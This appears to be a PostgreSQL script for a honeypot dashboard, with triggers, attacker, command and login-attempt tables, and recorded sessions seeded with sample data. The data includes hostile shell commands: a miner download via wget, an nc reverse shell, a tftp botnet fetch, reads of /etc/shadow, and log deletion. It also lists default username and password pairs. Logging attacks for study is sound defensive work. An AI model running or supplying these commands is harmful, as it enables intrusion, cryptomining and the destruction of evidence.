







CREATE OR REPLACE FUNCTION notify_attack_update() RETURNS trigger AS $$
BEGIN
  PERFORM pg_notify('attack_update', TG_TABLE_NAME);
  RETURN NULL;
END;
$$ LANGUAGE plpgsql;

-- Row changes: insert, update, delete
DROP TRIGGER IF EXISTS attempt_notify ON attempt;
CREATE TRIGGER attempt_notify AFTER INSERT OR UPDATE OR DELETE ON attempt
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS attempt_notify_truncate ON attempt;
CREATE TRIGGER attempt_notify_truncate AFTER TRUNCATE ON attempt
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS attacker_notify ON attacker;
CREATE TRIGGER attacker_notify AFTER INSERT OR UPDATE OR DELETE ON attacker
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS attacker_notify_truncate ON attacker;
CREATE TRIGGER attacker_notify_truncate AFTER TRUNCATE ON attacker
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS command_notify ON command;
CREATE TRIGGER command_notify AFTER INSERT OR UPDATE OR DELETE ON command
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS command_notify_truncate ON command;
CREATE TRIGGER command_notify_truncate AFTER TRUNCATE ON command
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS playlog_notify ON playlog;
CREATE TRIGGER playlog_notify AFTER INSERT OR UPDATE OR DELETE ON playlog
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

DROP TRIGGER IF EXISTS playlog_notify_truncate ON playlog;
CREATE TRIGGER playlog_notify_truncate AFTER TRUNCATE ON playlog
FOR EACH STATEMENT EXECUTE FUNCTION notify_attack_update();

-- Schema changes: DROP TABLE and CREATE TABLE
CREATE OR REPLACE FUNCTION notify_schema_change() RETURNS event_trigger AS $$
BEGIN
  PERFORM pg_notify('attack_update', 'schema');
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS schema_drop_notify;
CREATE EVENT TRIGGER schema_drop_notify ON sql_drop
EXECUTE FUNCTION notify_schema_change();

DROP EVENT TRIGGER IF EXISTS schema_create_notify;
CREATE EVENT TRIGGER schema_create_notify ON ddl_command_end
WHEN TAG IN ('CREATE TABLE')
EXECUTE FUNCTION notify_schema_change();




CREATE TABLE attacker(
    ip_address varchar(15) PRIMARY KEY,
	city varchar(40) NOT NULL,
	region varchar(40) NOT NULL,
	country varchar(40) NOT NULL,
	lat numeric(8,5) NOT NULL,
	lon numeric(8,5) NOT NULL,
	privacy text CHECK (privacy IN ('VPN detected','VPN not detected','VPN status unavailable'))
   
)

CREATE TABLE command(
	command_id INT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
	ip_address varchar(15) NOT NULL REFERENCES attacker,
	command text NOT NULL,
	cmd text CHECK (cmd IN ('FOUND','NOT FOUND'))
   
)

CREATE TABLE attempt(
	username varchar(40) NOT NULL,
	password_attempt varchar(40) NOT NULL,
	status text CHECK (status IN ('succeeded','failed')),
	ip_address varchar(15) NOT NULL,
	attack_timestamp timestamp NOT NULL,
	timezone varchar(50) NOT NULL,
	CONSTRAINT fk_ip_address FOREIGN KEY (ip_address) REFERENCES attacker(ip_address),
	PRIMARY KEY(password_attempt,ip_address,attack_timestamp)
)

CREATE TABLE playlog(
    session_id   TEXT PRIMARY KEY,
    cast_data    TEXT NOT NULL,
    width        INT  NOT NULL DEFAULT 80,
    height       INT  NOT NULL DEFAULT 24,
    duration_s   REAL NOT NULL DEFAULT 0,
    event_count  INT  NOT NULL DEFAULT 0,
    created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);

select * from attacker
select * from attempt
select * from command
select * from playlog

delete from attacker
delete from attempt
delete from command
delete from playlog

drop table attacker
drop table attempt
drop table command
drop table playlog


-- attacker
INSERT INTO attacker (ip_address, city, region, country, lat, lon, privacy) VALUES
('185.220.101.4',  'Frankfurt',        'Hesse',             'Germany',       50.11000,    8.68000, 'VPN detected'),
('45.155.205.233', 'Moscow',           'Moscow',            'Russia',        55.75580,   37.61730, 'VPN not detected'),
('103.145.13.77',  'Mumbai',           'Maharashtra',       'India',         19.07600,   72.87770, 'VPN status unavailable'),
('61.177.172.14',  'Nanjing',          'Jiangsu',           'China',         32.06030,  118.79690, 'VPN not detected'),
('179.43.187.90',  'Sao Paulo',        'Sao Paulo',         'Brazil',       -23.55050,  -46.63330, 'VPN detected'),
('198.51.100.23',  'New York',         'New York',          'United States', 40.71280,  -74.00600, 'VPN not detected'),
('203.0.113.58',   'Sydney',           'New South Wales',   'Australia',    -33.86880,  151.20930, 'VPN status unavailable'),
('91.240.118.172', 'Kyiv',             'Kyiv City',         'Ukraine',       50.45010,   30.52340, 'VPN not detected'),
('41.203.64.11',   'Lagos',            'Lagos',             'Nigeria',        6.52440,    3.37920, 'VPN detected'),
('118.69.55.201',  'Ho Chi Minh City', 'Ho Chi Minh',       'Vietnam',       10.82310,  106.62970, 'VPN not detected'),
('80.82.77.139',   'Amsterdam',        'North Holland',     'Netherlands',   52.36760,    4.90410, 'VPN detected'),
('190.2.145.66',   'Bogota',           'Bogota D.C.',       'Colombia',       4.71100,  -74.07210, 'VPN status unavailable'),
('5.188.206.14',   'Istanbul',         'Istanbul',          'Turkey',        41.00820,   28.97840, 'VPN not detected'),
('138.197.12.9',   'San Francisco',    'California',        'United States', 37.77490, -122.41940, 'VPN detected'),
('175.45.176.33',  'Seoul',            'Seoul',             'South Korea',   37.56650,  126.97800, 'VPN not detected');
 
-- command
INSERT INTO command (ip_address, command, cmd) VALUES
('185.220.101.4',  'whoami',                                              'FOUND'),
('185.220.101.4',  'uname -a',                                            'FOUND'),
('185.220.101.4',  'cat /etc/passwd',                                     'FOUND'),
('45.155.205.233', 'wget http://45.155.205.233/xmrig.sh -O /tmp/x.sh',    'NOT FOUND'),
('45.155.205.233', 'chmod +x /tmp/x.sh',                                  'NOT FOUND'),
('45.155.205.233', 'ls -la /tmp',                                         'FOUND'),
('103.145.13.77',  'ps aux | grep -i miner',                              'NOT FOUND'),
('103.145.13.77',  'cat /proc/cpuinfo',                                   'FOUND'),
('61.177.172.14',  'curl -s ifconfig.me',                                 'FOUND'),
('61.177.172.14',  'crontab -l',                                          'NOT FOUND'),
('179.43.187.90',  'id',                                                  'FOUND'),
('179.43.187.90',  'sudo -l',                                             'NOT FOUND'),
('198.51.100.23',  'history -c',                                          'FOUND'),
('198.51.100.23',  'ls /home',                                            'FOUND'),
('203.0.113.58',   'nc -e /bin/sh 203.0.113.58 4444',                     'NOT FOUND'),
('91.240.118.172', 'free -m',                                             'FOUND'),
('91.240.118.172', 'tftp -g -r bot.arm7 91.240.118.172',                  'NOT FOUND'),
('41.203.64.11',   'cat /etc/shadow',                                     'NOT FOUND'),
('41.203.64.11',   'ifconfig',                                            'FOUND'),
('118.69.55.201',  'busybox MIRAI',                                       'NOT FOUND'),
('80.82.77.139',   'netstat -tulpn',                                      'FOUND'),
('190.2.145.66',   'ssh-keygen -t rsa',                                   'NOT FOUND'),
('5.188.206.14',   'uptime',                                              'FOUND'),
('138.197.12.9',   'python3 -c "import pty;pty.spawn(''/bin/bash'')"',    'NOT FOUND'),
('175.45.176.33',  'df -h',                                               'FOUND'),
('175.45.176.33',  'rm -rf /var/log/*',                                   'NOT FOUND');
 
-- attempt (timestamps are UTC)
INSERT INTO attempt (username, password_attempt, status, ip_address, attack_timestamp, timezone) VALUES
('root',     '123456',        'failed',    '185.220.101.4',  '2026-10-12 01:14:22', 'Europe/Berlin'),
('root',     'admin',         'failed',    '185.220.101.4',  '2026-10-12 01:14:25', 'Europe/Berlin'),
('root',     'toor',          'succeeded', '185.220.101.4',  '2026-10-12 01:14:31', 'Europe/Berlin'),
('admin',    'password',      'failed',    '45.155.205.233', '2026-10-12 19:02:10', 'Europe/Moscow'),
('admin',    'admin123',      'failed',    '45.155.205.233', '2026-10-12 19:02:14', 'Europe/Moscow'),
('admin',    'qwerty',        'succeeded', '45.155.205.233', '2026-10-12 19:02:19', 'Europe/Moscow'),
('ubuntu',   'ubuntu',        'failed',    '103.145.13.77',  '2026-10-13 04:45:03', 'Asia/Kolkata'),
('ubuntu',   '12345678',      'failed',    '103.145.13.77',  '2026-10-13 04:45:07', 'Asia/Kolkata'),
('pi',       'raspberry',     'succeeded', '103.145.13.77',  '2026-10-13 04:45:12', 'Asia/Kolkata'),
('root',     'P@ssw0rd',      'failed',    '61.177.172.14',  '2026-10-13 15:30:40', 'Asia/Shanghai'),
('root',     'letmein',       'failed',    '61.177.172.14',  '2026-10-13 15:30:44', 'Asia/Shanghai'),
('root',     '111111',        'failed',    '61.177.172.14',  '2026-10-13 15:30:48', 'Asia/Shanghai'),
('oracle',   'oracle',        'failed',    '179.43.187.90',  '2026-10-14 23:10:55', 'America/Sao_Paulo'),
('postgres', 'postgres',      'succeeded', '179.43.187.90',  '2026-10-14 23:11:02', 'America/Sao_Paulo'),
('root',     'changeme',      'failed',    '198.51.100.23',  '2026-10-14 08:20:17', 'America/New_York'),
('deploy',   'deploy2024',    'failed',    '198.51.100.23',  '2026-10-14 08:20:21', 'America/New_York'),
('root',     'Summer2026!',   'succeeded', '198.51.100.23',  '2026-10-14 08:20:30', 'America/New_York'),
('guest',    'guest',         'failed',    '203.0.113.58',   '2026-10-15 02:05:09', 'Australia/Sydney'),
('guest',    '000000',        'failed',    '203.0.113.58',   '2026-10-15 02:05:13', 'Australia/Sydney'),
('root',     'dragon',        'failed',    '91.240.118.172', '2026-10-15 12:44:36', 'Europe/Kyiv'),
('root',     'iloveyou',      'failed',    '91.240.118.172', '2026-10-15 12:44:40', 'Europe/Kyiv'),
('admin',    'welcome1',      'succeeded', '91.240.118.172', '2026-10-15 12:44:49', 'Europe/Kyiv'),
('test',     'test',          'failed',    '41.203.64.11',   '2026-10-16 17:55:01', 'Africa/Lagos'),
('test',     'test123',       'failed',    '41.203.64.11',   '2026-10-16 17:55:05', 'Africa/Lagos'),
('root',     'abc123',        'failed',    '41.203.64.11',   '2026-10-16 17:55:11', 'Africa/Lagos'),
('support',  'support',       'failed',    '118.69.55.201',  '2026-10-16 22:33:27', 'Asia/Ho_Chi_Minh'),
('root',     'vizxv',         'succeeded', '118.69.55.201',  '2026-10-16 22:33:31', 'Asia/Ho_Chi_Minh'),
('root',     'monkey',        'failed',    '80.82.77.139',   '2026-10-17 06:12:44', 'Europe/Amsterdam'),
('root',     'master',        'failed',    '80.82.77.139',   '2026-10-17 06:12:48', 'Europe/Amsterdam'),
('git',      'git',           'failed',    '80.82.77.139',   '2026-10-17 06:12:53', 'Europe/Amsterdam'),
('root',     'football',      'failed',    '190.2.145.66',   '2026-10-17 10:01:19', 'America/Bogota'),
('ftpuser',  'ftpuser',       'succeeded', '190.2.145.66',   '2026-10-17 10:01:25', 'America/Bogota'),
('root',     'sunshine',      'failed',    '5.188.206.14',   '2026-10-18 21:48:05', 'Europe/Istanbul'),
('root',     '1q2w3e4r',      'failed',    '5.188.206.14',   '2026-10-18 21:48:09', 'Europe/Istanbul'),
('admin',    'admin@123',     'succeeded', '5.188.206.14',   '2026-10-18 21:48:16', 'Europe/Istanbul'),
('root',     'trustno1',      'failed',    '138.197.12.9',   '2026-10-18 03:27:38', 'America/Los_Angeles'),
('jenkins',  'jenkins',       'failed',    '138.197.12.9',   '2026-10-18 03:27:42', 'America/Los_Angeles'),
('root',     'zaq12wsx',      'failed',    '138.197.12.9',   '2026-10-18 03:27:47', 'America/Los_Angeles'),
('root',     'passw0rd',      'failed',    '175.45.176.33',  '2026-10-19 14:09:12', 'Asia/Seoul'),
('user',     'user',          'failed',    '175.45.176.33',  '2026-10-19 14:09:16', 'Asia/Seoul'),
('root',     'qazwsx',        'succeeded', '175.45.176.33',  '2026-10-19 14:09:23', 'Asia/Seoul'),
('root',     'admin',         'failed',    '45.155.205.233', '2026-10-19 09:15:00', 'Europe/Moscow'),
('root',     'root',          'failed',    '61.177.172.14',  '2026-10-19 00:41:30', 'Asia/Shanghai'),
('admin',    '1234',          'failed',    '185.220.101.4',  '2026-10-19 11:59:58', 'Europe/Berlin'),
('root',     'password1',     'failed',    '198.51.100.23',  '2026-10-20 16:22:41', 'America/New_York'),
('root',     'default',       'failed',    '103.145.13.77',  '2026-10-20 07:03:14', 'Asia/Kolkata'),
('admin',    'adminadmin',    'succeeded', '203.0.113.58',   '2026-10-20 05:50:20', 'Australia/Sydney');
 
-- playlog (asciicast v2 format)
INSERT INTO playlog (session_id, cast_data, width, height, duration_s, event_count, created_at) VALUES
('sess-185-220-101-4-a1b2c3',
$cast${"version": 2, "width": 80, "height": 24, "timestamp": 1760231671}
[0.1, "o", "root@srv01:~# "]
[1.2, "o", "whoami\r\n"]
[1.4, "o", "root\r\n"]
[2.0, "o", "root@srv01:~# "]
[3.5, "o", "uname -a\r\n"]
[3.6, "o", "Linux srv01 5.15.0-91-generic x86_64 GNU/Linux\r\n"]$cast$,
80, 24, 3.6, 6, '2026-10-12 01:15:00+00'),
 
('sess-45-155-205-233-d4e5f6',
$cast${"version": 2, "width": 120, "height": 30, "timestamp": 1760296939}
[0.2, "o", "admin@honeypot:~$ "]
[2.1, "o", "wget http://45.155.205.233/xmrig.sh -O /tmp/x.sh\r\n"]
[2.9, "o", "bash: wget: command not found\r\n"]
[4.0, "o", "admin@honeypot:~$ "]
[7.9, "o", "ls -la /tmp\r\n"]$cast$,
120, 30, 7.9, 5, '2026-10-12 19:03:30+00'),
 
('sess-198-51-100-23-g7h8i9',
$cast${"version": 2, "width": 80, "height": 24, "timestamp": 1760430030}
[0.3, "o", "root@db01:~# "]
[1.1, "o", "ls /home\r\n"]
[1.2, "o", "backup  deploy  ubuntu\r\n"]
[2.4, "o", "root@db01:~# "]$cast$,
80, 24, 2.4, 4, '2026-10-14 08:21:00+00'),
 
('sess-175-45-176-33-j0k1l2',
$cast${"version": 2, "width": 100, "height": 28, "timestamp": 1760882963}
[0.1, "o", "root@node7:~# "]
[1.5, "o", "df -h\r\n"]
[1.7, "o", "Filesystem      Size  Used Avail Use% Mounted on\r\n"]
[1.8, "o", "/dev/sda1        40G   12G   26G  32% /\r\n"]
[4.2, "o", "root@node7:~# "]
[9.0, "o", "rm -rf /var/log/*\r\n"]
[12.75, "o", "root@node7:~# "]$cast$,
100, 28, 12.75, 7, '2026-10-19 14:10:00+00');


DELETE FROM attempt
WHERE ip_address IN (
    SELECT ip_address
    FROM attempt
    GROUP BY ip_address
    HAVING MAX(attack_timestamp) - MIN(attack_timestamp) > INTERVAL '50 seconds'
);